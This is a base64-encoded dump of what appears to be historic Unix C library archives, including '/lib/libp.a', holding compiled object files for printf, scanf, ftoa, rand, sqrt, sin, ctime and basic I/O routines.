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
-- /lib/libp.a mode=0110664 uid=3 gid=3 atime=174923760 mtime=174921375 base64=1 --
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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAABgEAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAApAAAAKQAAAAAAAAAAAAIAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAJkEAAB5AgAAAAAAAAAAAAAAAAAACQAAAAkAAACZBAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAJAA
AAAAAAAAAAAAAAAAAAAAB5AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAAAkAAACZBAAAeQIAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKQAAAAAAAAApAAAAAAAAAAAAKQAAAAAA
AACZBAAAeQIAAAAAGQAAABkAAACZBAAAeQIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAkAAAAJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAACQAAAAAAAA
AAAAAAAAAAAJkEBAAEAAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAF9fcHRyYmYAIAACAF9fcHRyc3
QAIAACAF9fX2ZtdAAAIAACAF9wcmludGYAIgAAAEwxMDAwNAAAAwAeBEwxMDAwNQAAAwAm
BEwxMDAwNgAAAwAyBEwxMDAwNwAAAwBABEwxMDAwOAAAAwBIBEwyOQAAAAAAAgCaAUwyOA
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
Ed+P/ADTVy9P/AZTAAPZAMALUKDABBHfj/wA01cvT/dRD4/0Ed9P/ADRdyCgA1EPT/9Qv0
/+QGPYoMAHcAoP1mdG9hICAAAAAAyQAAAAAAAADZAAAAAAAAAAAABAAAAAgBAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPkCAAAA
AAAAAABfZnRvYQAAACIAAAB+ZnRvYQAAAAIAAABpZQAAAAAAAAEA+P9uZGlnAAAAAAEA8v
9wcmVjAAAAAAEADgBmb3JtYXQAAAEAEABmc3R5bGUAAAEA8P9pAAAAAAAAAAEA9v9rAAAA
AAAAAAEA9P94AAAAAAAAAAEABAB5AAAAAAAAAAEA6P9zdHIAAAAAAAEADABjc3YAAAAAAC
AAAABfbmFyZ3MAACAAAABMMgAAAAAAAAIAGgBMMwAAAAAAAAMAYAJfSUVIemFwACAAAABM
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
bGVtZW50ZWQKAHNjYW5mOiBiYWQgZm9ybWF0IHRlcm1pbmF0aW9uCgBzY2FuZjogZm9ybW
F0IGNoYXJhY3RlciAlYwAAAMkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADpAAAACAEZ
AQAAKAE5AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAIgBGQEAAJgBOQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAD5AQAAyQAAAAAAAAAAAAUAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAABAAAAAUAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAPkBAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAFkD
AAAAAAAAAAAAAAAAyQAAAAAAWQMAAAAAAAAAAAAAAAAAAAAA+QEAAAAAAAAAAAAAAAAAAA
AAAAAAAMkAAAAAAAAAAgAAAAAAAAAAAAAAAABIBAAAAAAAAAAAAAAAAAAAAAD5AQAAAAAA
AAAAiAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyQAAAAAAAAAAAAAAAAD4BAAAAAAAAAAAAA
D5AQAAAAAAAAQAAAAFAAAAAAAAAAAAAAAAAAAAAADJAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
